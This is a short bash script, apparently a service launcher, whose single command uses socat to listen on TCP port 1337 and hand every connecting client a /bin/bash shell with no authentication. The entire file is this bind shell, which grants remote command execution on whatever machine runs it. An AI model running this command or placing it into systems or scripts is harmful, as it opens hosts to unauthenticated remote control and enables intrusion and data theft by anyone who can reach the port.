#!/bin/bash

exec socat -v tcp-listen:1337,reuseaddr,fork,keepalive, EXEC:"/bin/bash",stderr
